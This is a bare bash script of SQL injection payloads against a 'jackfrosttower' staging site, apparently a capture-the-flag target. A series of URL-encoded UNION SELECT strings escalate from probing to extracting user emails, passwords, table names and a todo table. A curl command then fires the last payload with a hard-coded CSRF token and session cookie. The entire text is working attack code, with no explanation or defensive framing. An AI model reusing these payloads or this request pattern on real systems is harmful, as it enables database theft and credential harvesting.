#!/bin/bash

STR="https://staging.jackfrosttower.com/detail/200,1"
STR="https://staging.jackfrosttower.com/detail/200,(SELECT+1)"
STR="https://staging.jackfrosttower.com/detail/200,(SELECT+id)"
STR="https://staging.jackfrosttower.com/detail/1,(UNION%20SELECT%201%20FROM%20(SELECT%201)a%20--%20)"
STR="https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(SELECT%202)b%20JOIN%20(SELECT%203)c%20JOIN%20(SELECT%204)d%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20--"
STR="https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(SELECT%20email%20from%20users%20limit%201%20)b%20JOIN%20(SELECT%203)c%20JOIN%20(SELECT%204)d%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20--"
STR="https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema='encontact'%20limit%201%20offset%201%20)b%20JOIN%20(SELECT%20password%20from%20users%20limit%201)c%20JOIN%20(SELECT%204)d%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20--"
STR="https://staging.jackfrosttower.com/detail/1,%202%20UNION%20SELECT%20*%20FROM%20(SELECT%201)a%20JOIN%20(select%20*%20from%20todo)b%20JOIN%20(SELECT%205)e%20JOIN%20(SELECT%206)f%20JOIN%20(SELECT%207)g%20--"






curl -i -s -k -X $'GET' \
    -H $'Host: staging.jackfrosttower.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Upgrade-Insecure-Requests: 1' -H $'If-None-Match: W/\"8d2-yQICkOizH3cAdl9TgydDbnqrqXM\"' -H $'Te: trailers' \
    -b $'_csrf=4ThebgHvu33K8JEg5KsizVyg; connect.sid=s%3ArE8PLxUYVycyMZr8pkV0PzHXABWzTZZL.d5XvetHxoKOggD0yAnAc%2FBUp6VWAxXmVfvLPWEYyfmE' \
    $STR 


